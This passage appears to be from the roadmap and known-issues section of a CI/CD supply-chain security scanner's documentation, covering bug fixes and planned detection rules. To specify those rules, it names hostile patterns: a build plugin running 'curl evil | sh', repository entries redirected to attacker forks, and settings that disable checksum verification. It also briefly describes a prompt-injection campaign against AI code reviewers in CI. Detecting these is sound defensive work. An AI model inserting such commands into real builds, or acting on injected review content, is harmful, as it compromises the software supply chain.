- v0.3.x — Kubernetes provider, docs site, attack chains engine,
  English variant enforcement, doc-claim drift guards.
- v0.2.x — Cloud Build, Jenkins, Terraform, CloudFormation, JUnit
  and Markdown reporters, 13-standard mapping, autofix engine, HTML
  report interactivity.

## Known issues

Bugs found in a full feature review (2026-05-29). Each was confirmed
by reading the code path, not just inferred. File references are
approximate line anchors at review time.

The **high** and **medium** severity findings from this review are
fixed in v1.6.0 (see the ``### Fixed`` block in ``CHANGELOG.md``):
the remote-resolve redirect SSRF, the PyPI / Google secret-verifier
false-positives, the OSV truncated-batch caching, the host-blind
GitLab include cache key, the cross-repo reverse-direction dedup, the
terminal Rich-markup leak, the autofix line-ending flip on Windows,
the docker / package flag fixers reclassified ``unsafe``, and the
``history --dir`` fleet-aggregate ingestion. The **low** severity
items below were then swept on 2026-05-31 (fixed on ``dev``); each fix
is summarized in the ``### Fixed`` block in ``CHANGELOG.md``.

### Low (fixed 2026-05-31 on ``dev``)

- **JWT verifier uses wrong userinfo endpoints.** For Microsoft Entra
  it builds ``{issuer}/openid/userinfo`` instead of the Graph
  ``oidc/userinfo`` endpoint, and the Google entry points at a
  deprecated host (``jwt.py:67``). Active tokens come back
  UNKNOWN/UNVERIFIED (false negative, no false CRITICAL).
- **``--diff-base`` under-scans from a repo subdirectory.**
  ``changed_files`` (``diff.py:50``) treats git's repo-root-relative
  output as cwd-relative. Launched from a subdir, the path intersection
  misses real changes and ``_filter_context_by_diff`` drops files that
  actually changed, the opposite of the module's stated over-scan
  guarantee.
- **Terraform diff filter drops renamed-module resources.**
  ``_filter_terraform_by_diff`` (``scanner.py:796``) matches a module
  call label against the changed file's parent directory name. When the
  source directory differs from the call label (the common case,
  ``module "vpc" { source = "./modules/networking" }``), changed
  resources are dropped and never scanned.
- **GitLab ``project:`` include with a list-valued ``file:`` fails.**
  ``_fetch_project`` does ``str(file_path)`` (``gitlab/resolver.py:107``);
  GitLab allows ``file:`` to be a list, so ``str([...])`` builds a bogus
  URL that 404s and the includes are silently dropped.
- **SARIF ingest under-grades a missing ``level``.** A result with no
  ``level`` and no ``security-severity`` maps to INFO
  (``sarif_ingest.py:119``); the SARIF 2.1.0 default is ``warning``, so
  findings from tools that omit per-result level can be filtered out by
  a severity gate.
- **Fleet GitHub enumerator crashes on a null ``clone_url``.**
  ``r.get("clone_url", default)`` (``fleet.py:325``) only fills the
  default when the key is absent; a ``"clone_url": null`` value passes
  ``None`` into ``git clone`` and raises ``TypeError`` mid-enumeration.
  The GitLab and Bitbucket paths guard this with ``isinstance``; GitHub
  does not.
- **Rego/custom evaluator edge cases.** The regex haystack is truncated
  to 100 KB before matching (``evaluator.py:271``), so a ``$``-anchored
  pattern can match the truncation boundary instead of the real end;
  and numeric / length operators treat ``bool`` as a number
  (``evaluator.py:363``) since ``bool`` subclasses ``int``, so a YAML
  ``true`` compares as ``1`` rather than failing the type check.
- **Passing Rego findings drop metadata.** ``make_passing_findings``
  (``rego_runner.py:222``) does not copy ``cwe`` / ``incident_refs`` /
  ``exploit_example`` the way the YAML path and failing Rego findings
  do, and K8s Rego violations default ``resource`` to ``<unknown>``
  because ``input_data`` has no top-level ``path`` key
  (``rego_runner.py:173``).
- **Cosmetic.** ``history._svg_line_chart`` renders a real chart for an
  all-zero dataset instead of the "no data" placeholder
  (``history.py:362``); ``inline_ignore`` captures ``reason=`` with
  ``\S+`` so multi-word reasons truncate at the first space
  (``inline_ignore.py:31``); gate baseline matching does not normalize
  path separators, so a baseline written on one OS can fail to suppress
  on another (``gate.py:429``).

## Candidates

Larger items not yet scoped to a specific release. Landing order
is open.

### ~~``--inline-explain`` across every reporter~~ shipped

Shipped on ``dev``. The gate moved out of the terminal reporter into a
shared ``inline_exploit(finding, inline_explain)`` decision in
``checks/base.py`` that every reporter consults. ``exploit_example``
now lands in the SARIF rule ``help`` (text + markdown), the JUnit
``<failure>`` body, a collapsible markdown Proof-of-exploit section
(the failures table is a fixed five-column grid, so the snippets get
their own section rather than an extra column), and the Code Quality
issue ``description`` (fingerprint unchanged so dismissed MR threads
don't churn). JSON and HTML still carry the field unconditionally.

### VS Code extension

The TypeScript half of the editor-surface push; the LSP server
itself is shipped (see v1.1.0). Extension lives in
``pipeline-check-vscode`` and spawns ``python -m pipeline_check.lsp``
over stdio JSON-RPC. Trade-off accepted: the stdio schema becomes
a stable contract between the two repos, in exchange for keeping
the TS / ``vsce publish`` toolchain out of the Python project.

### Pipeline graph DAG v2 (step-level)

Phase 1 (blast-radius heatmap) shipped in v1.0.x. Phase 2 lifts the
heatmap to step-level granularity: steps as nodes, ``needs:`` /
``depends_on:`` / sequence as edges, findings rendered as
severity-colored badges on each node. Requires extending the
Scanner-to-reporter API so the parsed pipeline structure flows
through; the v1 heatmap intentionally avoided that plumbing change.

### Reachability-aware attack chains

Phase 1 (shared-job intersection) shipped incrementally across the
chain pack. Phase 2 is the dataflow-DAG variant: walk the TAINT
engine's DAG between the two anchor findings and only fire when an
executable connection exists. Requires extending TAINT findings to
expose their source / sink coordinates on a cross-document graph;
the v1.0.x TAINT engine carries this state per-workflow but doesn't
yet expose it to the chain engine.

### Pluggable LLM-assisted triage (opt-in, local)

A ``--triage`` flag pipes each finding through a local-only LLM
(Ollama, llama.cpp, LM Studio) plus the surrounding pipeline
snippet, asking for a short "is this actually exploitable in this
repo's context" verdict. Three labels: ``confirmed``,
``needs_review``, ``likely_fp``. Strict no-network default; remote
endpoints require an explicit ``--triage-endpoint URL`` flag.
Output is advisory, never gates the build.

### Cross-scanner comparison benchmark

The ``greylag-ci/cicd-goat`` 38-scenario matrix already tracks
pipeline-check against other scanners per-scenario. A broader
comparison matrix (vs Zizmor / Poutine / Checkov / KICS / Trivy)
across multiple goat repos would earn external credibility. Probably
warrants extraction to a separate ``pipeline-check-bench`` repo.

### ~~Live Azure + GCP cloud-posture parity~~ shipped

Shipped in v1.6.0 (closes #163). Both providers now ship 50 rules
each across identity, network, storage, compute, and logging, with
CIS Azure Foundations and CIS GCP Foundations standards mappings.

### ~~Self-hosted findings-history dashboard~~ shipped

Shipped in v1.6.0 (closes #160). ``pipeline_check history`` renders
posture trends from a directory of ``findings.json`` snapshots, with
per-rule burn-down sparklines, a resource-level heatmap, and fleet
``--output-dir`` recursive loading.

### GitHub Actions dependency locking support

GitHub's 2026 Actions security roadmap introduces a ``dependencies:``
YAML section that locks all direct and transitive action dependencies
by commit SHA (analogous to Go's ``go.sum``). When the feature ships:
a rule flagging workflows missing the section, a rule checking SHA
consistency, and parser support. First-mover advantage: no scanner
currently validates this section.

### ~~Behavioral supply-chain signals (maintainer depth, provenance)~~ shipped

All three dependency-trust signals from the ``proof-of-commitment`` /
getcommit.dev review now ship as NPM-014 / NPM-015 / NPM-016, each
``--resolve-remote``-gated, scoped to direct dependencies, and LOW
severity (posture signals below the default gate). The thesis: behavioral
signals (who can publish, how a package is built) catch compromise that
stars, download counts, and ``npm audit`` miss.

- **Single-publisher risk (maintainer depth). NPM-014.** Flags a direct
  dependency whose npm ``maintainers`` array has one entry, a single
  point of compromise (the axios / chalk / lodash account-takeover
  class). Reads the ``maintainers`` list from the packument NPM-008
  already fetches, so no new network surface.
- **Dependency provenance gap. NPM-015.** Flags a direct dependency
  whose latest version ships no build-provenance attestation
  (``dist.attestations``), so it can't be traced to its source commit
  and CI build (the SLSA Build L3 / PEP 740 guarantee this project ships
  on its own wheel). Reads npm's per-version attestation surface.
- **OpenSSF Scorecard surfacing. NPM-016.** Resolves each direct
  dependency's GitHub repo and queries the OpenSSF Scorecard API,
  flagging upstreams that score below 5/10 or fail the Dangerous-Workflow
  check. The heaviest of the three (one extra API per linked repo).

The PyPI parallels then shipped two of the three: **PYPI-019**
(missing PEP 740 provenance, the NPM-015 analog, reads the per-file
``provenance`` field on the latest release from the PyPI JSON API) and
**PYPI-020** (low upstream OpenSSF Scorecard, the NPM-016 analog,
resolves the GitHub repo from ``info.project_urls`` and reuses the
shared ``_primitives/scorecard`` client). The single-publisher analog
(NPM-014) is deliberately **not** shipped: PyPI exposes no public
maintainer-account-list API, only the freeform ``info.maintainer`` /
``info.author`` metadata fields, which are too unreliable to flag on,
exactly the gate the roadmap flagged. The provenance parser returns
``None`` (skip) rather than ``False`` when the index doesn't expose the
attestation field at all, so it never flags every dependency if PyPI's
surface changes. Both are LOW, ``--resolve-remote``-gated, scoped to
direct index dependencies, and reuse the per-package JSON document the
cooldown / OSV passes already fetch.

Still open as follow-ups: a recent-ownership-change / new-account
signal to pair with NPM-014 (the actual takeover vector, worth a higher
severity), and a PyPI single-maintainer signal if PyPI ever exposes a
reliable owner-list API.

### Weak-coverage provider deepening

**Status (2026-05-30):** batches shipped on ``dev`` for nuget
(NUGET-016/018/019), composer (COMPOSER-011..014), pulumi
(PULUMI-011..013), argocd (ARGOCD-014/015/017; 016 skipped), pypi
(PYPI-015..018), gomod (GOMOD-011/012), rubygems (GEM-011/012/013),
maven (MVN-015..018), cargo (CARGO-011/012/013), and helm
(HELM-015/016/017). With cargo and helm in, every provider the
2026-05-29 coverage pass flagged has shipped its first deepening batch.
The two loader extensions the pass called out both landed: cargo's
loader now reads the sibling ``build.rs``, walks up to the nearest
``.cargo/config.toml``, and keeps the ``Cargo.lock`` body; the helm
``Chart`` now carries the parsed ``values.yaml`` and the
``templates/`` file texts (dir + ``.tgz`` member). The
gomod / rubygems / maven batch needed no base-loader reads beyond a
``tool``-directive parse (gomod) and a per-gem ``source:`` surface
(rubygems); the maven rules reparse the POM / settings XML in-rule the
way MVN-010 / MVN-012 already do, and MVN-016 reads the Gradle script
text. GOMOD-012 ships as bare-IP / explicit-port host detection only:
a ``http://`` scheme can't survive the go.mod ``//`` comment stripper
and never appears in a canonical module path anyway.

The deferred fourth-picks batch then shipped NUGET-017 (public gallery
active alongside a private feed and not in
``<disabledPackageSources>``, the explicit-coexistence complement to
NUGET-016's inheritance case), CARGO-014 (no committed
cargo-deny / cargo-vet / cargo-audit gate, LOW posture, needed a small
loader probe for the gate config files), PULUMI-014 (an ESC
``environment:`` import without a project / org qualifier, the
StackReference-drift primitive applied to ESC), ARGOCD-016 (Helm
``valueFiles`` fetched from a remote ``http(s)`` URL, scoped to that
unambiguous case to keep FP low), and ARGOCD-018 (custom resource
health / action Lua in ``argocd-cm``, controller-side code). Still
open, and now genuinely deferred with rationale: **PULUMI-015**
(Automation-API inline shell) overlaps PULUMI-008's shell-exec scan
too heavily to ship as a separate rule without double-reporting;
**HELM-018** (values default image not digest-pinned) overlaps
K8S-001 once the chart renders, and **HELM-019** (subchart host
mismatch) is noisy; **GEM-014** (``git_source`` block) is noisy and
overlaps GEM-010, **GEM-015** (gemspec floating ``add_dependency``)
needs a gemspec parser the rubygems loader doesn't have. The
**GOMOD-013/014** idea (CI env-vars disabling sum-db verification) then
shipped as the shared-primitive batch it always wanted to be:
``_primitives/go_insecure_env.py`` plus per-provider rules GHA-110 /
GL-037 / CC-033 (GitHub Actions, GitLab CI, CircleCI, where Go CI
actually runs), each flagging ``GOFLAGS=-insecure`` / ``GOSUMDB=off`` /
``GONOSUMCHECK`` / any ``GOINSECURE`` / a broad ``GOPRIVATE`` /
``GONOSUMDB`` (013's hard-disables + 014's over-broad-glob folded into
one HIGH rule). Bitbucket and Azure DevOps were left out (negligible Go
CI, FP-risky env schemas); the primitive is shared, so adding them is a
small follow-up. (The PyPI parallels of the NPM behavioral-trust
signals then shipped as PYPI-019 / PYPI-020; the single-maintainer
analog stays deferred, no reliable PyPI owner-list API. See the
behavioral-signals candidate above.)

A 2026-05-29 coverage pass ranked every provider by shipped rule count
and ran a per-provider gap analysis on the thinnest packs. The
registry, IaC, and GitOps providers at the bottom of the table (cargo,
composer, gomod, pulumi, rubygems at 10 each; argocd and pypi in the
low teens; helm, maven, nuget at 14 to 15) each have a class of attack
surface their current rules don't touch. Every candidate below was
checked against the live pack and confirmed net-new. Each is a static,
text-only signal unless flagged otherwise.

The recurring theme: these packs pin versions and sources well but
barely touch two surfaces. First, build-time / install-time code
execution (the class behind the xz-utils backdoor and the npm
lifecycle-script attacks). Second, the source-substitution and
dependency-confusion config knobs (the Birsan 2021 class). Both are
statically detectable from files the providers already parse, with a
few loader extensions noted inline.

**cargo (10 rules).** The pack covers manifest-declared sources well
but never inspects compile-time code execution or the config layer.

- **CARGO-011: build.rs runs network or process calls at compile time
  (HIGH).** Read the sibling ``build.rs`` (a file the loader doesn't open
  today) and flag egress / exec idioms (``std::process::Command``,
  ``std::net``, ``reqwest`` / ``ureq``, ``include!`` of a fetched path).
  The Rust analog of an npm install-script or the xz build-step backdoor;
  reserve HIGH for the network / ``include`` idioms since legit
  ``build.rs`` files shell out to ``pkg-config`` / ``cc``.
- **CARGO-012: .cargo/config.toml overrides the default registry source
  or injects build flags (HIGH).** A ``[source.crates-io] replace-with``
  reroutes the entire dependency graph without touching a ``Cargo.toml``
  line, and ``[build] rustflags`` can run a binary at link time. Fills the
  gap CARGO-005's own ``docs_note`` calls out. Needs the loader to glob
  ``.cargo/config.toml`` (same pattern as npm's ``.npmrc``).
- **CARGO-013: Cargo.lock package sourced off crates.io (MEDIUM).** Read
  the lockfile body (today only its presence is probed for CARGO-003)
  and flag any ``[[package]]`` whose ``source`` is a git /
  alternate-registry / replaced source. Catches transitive source
  substitution the manifest rules (002 / 005 / 008) can't reach.
- Weaker: **CARGO-014: no supply-chain audit gate config (cargo-deny /
  cargo-vet / cargo-audit) present (LOW)**, a posture signal parallel to
  CARGO-010. Rejected: a ``cargo build --locked`` enforcement rule (that
  is a CI-provider rule, not a cargo rule); proc-macro pinning (not
  statically decidable from the consumer manifest); yanked-version
  detection (needs the network).

**gomod (10 rules).** The pack audits the dependency coordinates but
nothing in the verification-bypass surface GOMOD-001's own prose warns
about.

- **GOMOD-011: go.mod ``tool`` directive pulls an executable build
  dependency (MEDIUM).** The Go 1.24 ``tool`` directive promotes a module
  to a build-time executable that ``go generate`` / ``go tool`` runs.
  In-file signal, small parser add; pair with a ``known_fp`` note since
  tooling-heavy repos use it normally.
- **GOMOD-012: require / replace targets an insecure or non-canonical
  host (HIGH).** Flag a module path over plain ``http://``, a bare IP
  literal, or an explicit ``:port``. The module-graph analog of the
  PyPI / JFrog insecure-host rules; operates on already-parsed
  coordinates.
- **GOMOD-013 / GOMOD-014: CI environment disables module checksum /
  sum-db verification (HIGH). Shipped, as CI-provider rules.** The
  env-var twin of GOMOD-001 (sum file committed, runner told to ignore
  it). Built as the shared primitive
  ``_primitives/go_insecure_env.py`` plus per-provider rules **GHA-110**
  / **GL-037** / **CC-033** (not a gomod ID, since the setting lives in
  the CI config, not ``go.mod``, and growing the gomod loader into a
  CI-config scanner was the wrong shape). Each flags
  ``GOFLAGS=-insecure``, ``GOSUMDB=off``, truthy ``GONOSUMCHECK``, any
  ``GOINSECURE``, and a broad ``GOPRIVATE`` / ``GONOSUMDB`` glob (013's
  hard-disables + 014's over-broad-glob folded into one HIGH rule).
  ``GOPROXY=off`` / ``direct`` are deliberately not flagged (neither is
  an integrity bypass on its own). Scoped ``GOPRIVATE`` passes. Rejected:
  ``//go:generate`` and ``go.work`` rules (the provider loads neither Go
  source nor ``go.work`` today).

**composer (10 rules).** The pack defends transport, versions, and
credentials but never reasons about the ``repositories`` array as a
resolution override.

- **COMPOSER-011: repository points a package name at an external VCS
  source (HIGH).** A ``{"type":"vcs","url":".../evil/guzzle"}`` entry
  re-points a public coordinate to an attacker fork, and Composer
  resolves custom repos ahead of Packagist. The Composer face of the
  dependency-confusion class.
- **COMPOSER-012: disables Packagist or marks a custom repo canonical
  (HIGH).** ``{"packagist.org": false}`` or ``"canonical": true`` makes a
  custom repo authoritative for every name it can serve. Highest-
  confidence, lowest-FP of the set (exact key / value reads).
- **COMPOSER-013: config.disable-tls turns off certificate verification
  (HIGH).** Strictly worse than the ``secure-http: false`` COMPOSER-010
  (MEDIUM) covers; this skips cert validation on the HTTPS connections
  Composer still makes. One-key lookup mirroring COMPOSER-008.
- **COMPOSER-014: minimum-stability lowered without prefer-stable
  (MEDIUM).** The companion to COMPOSER-005: ``prefer-stable: true``
  collapses the dev-branch surface to only packages that truly require a
  pre-release. Needs a one-line parser add for the top-level
  ``prefer-stable`` key. Rejected: a generic scripts-runs-shell rule
  (overlaps COMPOSER-006 and fires on benign ``phpunit`` entries);
  ``prefer-source`` (weak signal); per-plugin trust (needs a reputation
  feed).

**rubygems (10 rules).** The pack covers the source and git-pin layers;
the hole is Gemfile-level code-execution directives that aren't gem
entries at all.

- **GEM-011: Gemfile registers a Bundler ``plugin`` that runs at install
  time (HIGH).** Bundler plugins execute their ``plugin.rb`` during
  ``bundle install``, before any app code. GEM-010 (dynamic gem-list
  resolution) explicitly does not match ``plugin``. Single regex over the
  raw text.
- **GEM-013: git / github gem fetched over an insecure transport
  (HIGH).** A ``git: "git://..."`` or ``http://`` clone has no integrity;
  ``dep.git_url`` is already parsed and GEM-003 (HTTP source) and GEM-005
  (missing ref) both pass it today.
- **GEM-012: gem pinned to a per-gem ``:source`` (MEDIUM).** The per-gem
  face of GEM-007's multiple-top-level-sources confusion. Needs a small
  parser add to surface the ``source:`` option value and careful prose to
  delineate it from GEM-007. Deferred: **GEM-014** (``git_source`` block,
  noisy, overlaps GEM-010) and **GEM-015** (``*.gemspec`` floating
  ``add_dependency``), which is blocked on a gemspec parser the provider
  doesn't have (it loads only ``Gemfile`` + ``Gemfile.lock`` presence).

**pulumi (10 rules).** The conspicuous hole is the supply-chain surface
of the manifest itself: nothing reads the ``Pulumi.yaml`` ``plugins:``
block, and PULUMI-008 only catches the shell-exec path of deploy-time
code.

- **PULUMI-011: plugin pulled from a custom download server (HIGH).** A
  provider / analyzer plugin is native code that runs with the
  orchestrator's cloud credentials during ``pulumi up``; a ``server:``
  override moves the download off the trusted registry. Pure dict walk
  over the already-parsed ``project.data["plugins"]``.
- **PULUMI-012: plugin version unpinned or floating (MEDIUM).** An absent
  or range-pinned ``version:`` lets the binary that runs at deploy time
  change without a code change. Same traversal as 011.
- **PULUMI-013: dynamic provider runs arbitrary code at deploy time
  (HIGH).** A ``pulumi.dynamic.ResourceProvider`` body is engine-invoked
  code, serialized into state with any captured secrets. Source regex
  like 005 / 006 / 008; scoped to Python + Node where the API exists.
- Secondary: **PULUMI-014** (ESC ``environment:`` import without an org
  qualifier, MEDIUM, the StackReference-drift primitive applied to ESC)
  and **PULUMI-015** (Automation API embeds inline shell, HIGH, gated on
  an Automation-API signal to avoid double-reporting PULUMI-008). The
  strongest three are 011, 012, 013.

**argocd (13 rules).** Strong on AppProject guardrails and RBAC; the
blind spot is the Application's own source-rendering tools that execute
code at sync time, plus the instance-wide exec toggle.

- **ARGOCD-014: web terminal / ``exec.enabled`` set in argocd-cm
  (CRITICAL).** One ConfigMap key opens an interactive shell into any
  managed pod, gated only by the RBAC ARGOCD-004 already shows is
  frequently wildcarded. Reuses the ARGOCD-009 truthy-toggle pattern.
- **ARGOCD-017: Application deploys to the in-cluster API from a mutable
  source (HIGH).** ``spec.destination.server`` is
  ``https://kubernetes.default.svc`` and the source is a branch / HEAD.
  Closes a structural gap: ARGOCD-002 / 011 only evaluate AppProject
  wildcards, never the Application's own destination. Reuses ARGOCD-010's
  immutable-ref helper.
- **ARGOCD-015: Kustomize source enables the Helm plugin
  (``--enable-helm``) (HIGH).** Turns a Kustomize app (which ARGOCD-008
  carves out as safe) into a remote chart fetch-and-execute path. Scope
  to the ``argocd-cm`` ``kustomize.buildOptions`` toggle, the cleanest
  static target.
- Also: **ARGOCD-016** (Helm ``valueFiles`` from a foreign repo, HIGH)
  and **ARGOCD-018** (custom resource health / action Lua in argocd-cm,
  MEDIUM). Highest-value, lowest-effort are 014 and 017.

**pypi (14 rules; next free ID is PYPI-015).** Tight on flag-presence and
pinning shapes; the gap is artifacts that bypass index resolution
entirely.

- **PYPI-015: requirement installed from a direct artifact URL (HIGH).**
  A ``name @ https://host/foo.whl`` or bare tarball line pulls bytes from
  one host with no name / version / hash gating. PYPI-004 matches only
  VCS schemes and PYPI-001 explicitly skips ``http(s)`` URL specs, so no
  rule sees this today.
- **PYPI-016: primary --index-url points at a non-PyPI host (HIGH).**
  PYPI-005 flags only the additive ``--extra-index-url``; the
  substitutive vector (the primary index silently repointed, the
  pip.conf / ``PIP_INDEX_URL`` tamper) is unguarded. Leans on
  ``known_fp`` for legitimate internal mirrors.
- **PYPI-017: --find-links to a remote host (MEDIUM).** Parsed today but
  unused; escalate when ``--no-index`` is also set (find-links becomes
  the sole source) or the URL is ``http://``.
- Also: **PYPI-018** (``--no-binary`` forces the sdist build path, the
  install-time code-execution surface, MEDIUM). Rejected: a ``setup.py``
  body scanner (the provider loads no source files) and a ``--pre`` rule
  (hygiene more than supply chain; PYPI-008's cooldown covers the
  fresh-carrier-version slice).

**helm (14 rules).** The pack is almost entirely a Chart.yaml /
Chart.lock metadata audit; it never reads ``values.yaml`` or the chart's
own ``templates/``.

- **HELM-015: OCI chart dependency not digest-pinned (HIGH).** HELM-003
  accepts every ``oci://`` repo unconditionally; a floating OCI tag lets
  the registry serve different chart content under the same reference. No
  new plumbing (reuses HELM-002's digest-shape helper).
- **HELM-016: values.yaml ships a default secret or credential (HIGH).**
  A real password baked into shipped defaults installs into the cluster
  on a plain ``helm install``. The K8s render pass misses it when the
  value is consumed via ``{{ .Values.x | b64enc }}`` into a Secret. Needs
  a ``values.yaml`` reader keyed off ``chart.path`` (plus the ``.tgz``
  member case).
- **HELM-017: template renders an untrusted value through ``tpl``
  (HIGH).** A ``{{ tpl .Values.x . }}`` re-evaluates a user value as a Go
  template, a chart SSTI sink the render pass can't see. Needs the same
  template reader as HELM-016.
- Secondary: **HELM-018** (values default image floating / no digest,
  MEDIUM, overlaps K8S-001) and **HELM-019** (subchart locked to a
  different host than declared, MEDIUM, noisy). Ship 015 / 016 / 017
  first; 016 and 017 share a one-time values / template reader.

**maven (14 rules).** Pins versions, transport, credentials, and the
wrapper thoroughly but has zero coverage of build-time code-execution
plugins, the dominant real-world Maven build-RCE primitive.

- **MVN-015: pom binds a build-time code-execution plugin to the
  lifecycle (HIGH).** ``exec-maven-plugin``, ``maven-antrun-plugin``,
  ``gmavenplus-plugin``, ``frontend-maven-plugin`` with an
  ``<execution>`` bound to a phase run arbitrary host commands during
  ``mvn package``. MVN-012 only checks the plugin's ``<version>``; it
  passes a perfectly pinned ``exec-maven-plugin`` that runs
  ``curl evil | sh``. Reuses MVN-012's plugin walk; scope the first cut
  to ``pom.xml``.
- **MVN-016: build.gradle re-enables HTTP via ``allowInsecureProtocol =
  true`` (HIGH).** The explicit opt-out Gradle 7+ requires to allow an
  ``http://`` repo. Catches the case MVN-003 misses when the repo URL is
  a property the regex extractor can't resolve.
- **MVN-017: settings.xml ``<server>`` ships a private key with an inline
  passphrase (HIGH).** The SSH / GPG-credential sibling of MVN-010's
  plaintext ``<password>``; reuses MVN-010's encrypted-vs-``${}``
  discriminator. Lower frequency than ``<password>``.
- Also: **MVN-018** (a ``<distributionManagement>`` release target that
  accepts mutable SNAPSHOTs, MEDIUM). Scope tightly to the
  SNAPSHOT-acceptance angle since the ``http://`` deploy-URL half is
  already MVN-003.

**nuget (15 rules). First batch shipped (NUGET-016 / 018 / 019), now
18 rules.** The headline gap was public-feed inheritance, the canonical
.NET dependency-confusion shape, plus MSBuild build-time execution.

- **NUGET-016: private feed without ``<clear/>`` inherits the public
  gallery (HIGH). Shipped.** NuGet merges ``packageSources`` across
  machine / user / repo configs, so a repo config listing only the
  internal feed still resolves ``nuget.org`` and the highest-version-wins
  rule lets a public typosquat override an internal package. Microsoft's
  "3 Ways to Mitigate Risk" names ``<clear/>`` as the fix. NUGET-007 only
  fires when one config enumerates 2+ sources, so it structurally misses
  this.
- **NUGET-019: signatureValidationMode = require but ``<trustedSigners>``
  is empty or missing (HIGH). Shipped.** The exact follow-up NUGET-012's
  ``docs_note`` flags: ``require`` only rejects untrusted packages when
  there is a populated signer list to validate against.
- **NUGET-018: PackageReference / Import runs build-time MSBuild logic at
  restore/build (HIGH). Shipped.** Packages ship ``build/<id>.props`` and
  ``.targets`` that MSBuild auto-imports, the .NET analog of a
  ``postinstall`` script. Scoped to high-signal shapes (an ``<Exec>`` in a
  build / restore-phase ``<Target>``, an ``<Import>`` of a
  ``GeneratePathProperty`` package ``build/`` path) to control the FP
  rate.
- Still open: **NUGET-017** (public gallery not in
  ``<disabledPackageSources>`` when a private feed exists, HIGH); it
  detects a genuinely different config state from 016 but overlaps
  conceptually, so decide whether both should fire on one repo. Follows
  NUGET-012's ElementTree-reparse pattern, so it needs no shared-parser
  change.

Cross-cutting note: several of the highest-value candidates need a small
loader extension rather than just a new rule module (cargo's ``build.rs``
/ ``.cargo/config.toml`` / ``Cargo.lock``-body reads; rubygems' gemspec
parser for the deferred GEM-015; helm's ``values.yaml`` / template
reader). The gomod env-var checks (013 / 014) are better placed in the
existing CI provider packs via a shared primitive than bolted onto the
gomod loader. Landing order is open; the per-provider "strongest" picks
above are the suggested first batch.

### SDLC posture graph from fleet data

The fleet scanner and CXPC chain engine already compute cross-repo
relationships. Expose the implied graph as a JSON graph and a
lightweight HTML visualization bundled in the fleet report. This is
what commercial ASPM tools (Cycode, Legit Security, Apiiro) sell as
"pipeline topology." Builds on the fleet phase 2 infrastructure.

### AI agent pipeline risk rules

The HackerBot-Claw campaign (February 2026) demonstrated AI prompt
injection against Claude-based code reviewers in CI. Current
coverage: GHA-058 (agentic CLI with bypass flags / PR-checkout
topology), GHA-103 (AI review bot on untrusted trigger without
environment gate), GHA-104 (AI agent auto-push without PR review),
GHA-106 (agentic CLI in a job whose GITHUB_TOKEN carries write scope,
the over-permissive-token gap, broader than GHA-061's App-token mint
check), and AC-035 (the reviewer-and-committer chain: GHA-103 paired
with GHA-104 / GHA-106 on the same workflow), and GHA-111 (an agentic
CLI co-located in one job with an unattended IaC apply, ``terraform
apply`` / ``cloudformation deploy`` / ``cdk deploy`` / ``pulumi up``, so
a prompt-injected agent's generated infrastructure reaches the cloud
account, not just the repo). GHA-111 closes the AI-generated-IaC gap
this section flagged, the agent-edits-Terraform / CloudFormation
surface distinct from the workflow-YAML surface the other rules cover.
AC-037 then shipped the reachability chain this theme called for: it
pairs an untrusted-input agent leg (GHA-058 agentic-CLI bypass /
PR-checkout topology, or GHA-103 review bot on an untrusted trigger)
with GHA-111 on one workflow, the cloud-account analog of AC-035's
repo-write reviewer-and-committer loop. The AI-agent pipeline-risk
theme is now fully covered, rule and chain.

### ~~Gitea / Forgejo provider~~ shipped

Shipped in v1.6.0. ``--pipeline gitea``
reuses :class:`GitHubContext` and the full GHA rule pack against
``.gitea/workflows/`` and ``.forgejo/workflows/`` directories.

### Secret verifier expansion (phase 3)

Phases 1 and 2 brought verifier count from 9 to 25. Remaining
high-value additions that are blocked on detector or pairing gaps:

- AWS (STS ``GetCallerIdentity``) — needs paired access-key + secret;
  the detector only captures the access-key ID.
- Azure (Microsoft Graph ``/me``) — Azure tokens are opaque JWTs
  without a stable prefix pattern; needs a detector first.
- JFrog — Artifactory Cloud tokens lack a reliable prefix that
  distinguishes them from generic base64; self-hosted instances
  require a user-supplied URL.
- Datadog, PagerDuty — API keys are 32-40 char hex without a
  distinctive prefix; too generic for shape-only detection.
- Twilio — ``SK`` prefix detector exists but verification needs the
  paired auth token (same paired-credential gap as AWS).
- Generic entropy-based detection for tokens from services without
  a dedicated verifier.

### ~~Secrets-in-CI-logs detection~~ shipped

Shipped in v1.6.0. GL-036, BB-032, ADO-031, CC-032 cover GitLab,
Bitbucket, Azure DevOps, and CircleCI; GHA-033 already covered GitHub
Actions. Shared logic in ``_primitives/log_leak.py``.

### ~~GitLab Code Quality output format~~ shipped

Shipped in v1.6.0. See the v1.6.0 entry above.

### Auto-remediation PRs (``pipeline_check fix-pr``)

A subcommand that runs the scan, applies safe fixers, and opens a
PR via ``gh pr create`` / GitLab API. The scanner already computes
unified diffs; this is plumbing. Closes the gap between "patch on
disk" and "PR in your inbox" that drives adoption in orgs that scan
in CI but never act on findings.

### ~~Fixer discoverability (``--list-fixers``)~~ shipped

Shipped on ``dev``. ``--list-fixers [--safety safe|unsafe|all]`` lists
the 111 autofixers with the tier each belongs to. The "why ``--fix``
didn't patch a specific finding" part is surfaced as a footer note
(idempotent skip, YAML round-trip bail) rather than per-finding
diagnostics, which would need the finding + file content threaded into
the listing path.

### Self-hosted runner security rules

The highest-signal angle shipped on ``dev`` as GHA-105: a self-hosted
runner reachable from a ``pull_request`` / ``pull_request_target``
trigger, so fork code runs on persistent org infrastructure. The other
two angles from the original scoping turned out to be covered or not
statically detectable:

- ``runs-on`` labels that accept any contributor's PR is GHA-105 (the
  trigger reaches the runner); the interpolation variant is already
  GHA-036.
- Persistent runner tokens without rotation is a runner-registration
  config concern, not something visible in the workflow YAML, so it's
  out of scope for a static workflow scanner.

The last static candidate then shipped as GHA-112: a deploy job on a
self-hosted runner with no protected ``environment:`` gate, the HIGH
self-hosted case of GHA-014's MEDIUM ungated-deploy (it reuses the
shared deploy name / command vocabulary but scopes to the self-hosted
runner, where persistent infrastructure holds standing deploy
credentials). It completes the self-hosted-runner pack alongside
GHA-012 (ephemeral), GHA-068 (deprecated runner image), and GHA-105
(reachable from a PR trigger). StepSecurity's ``harden-runner``
egress agent, earlier called out of scope as a runtime agent, now ships
as a three-rule pack: GHA-107 (present but in audit mode, egress not
blocked), GHA-108 (an OIDC / environment-gated job with no egress
control at all), and GHA-109 (present but not the first step, so earlier
steps' traffic is uncovered). AC-036 chains the egress gap to a
code-execution leg (GHA-003 / 035 / 016 / 044), promoting the LOW egress
advisories to a HIGH finding when untrusted code can run with no
outbound containment. The remaining static angle is the runner-token
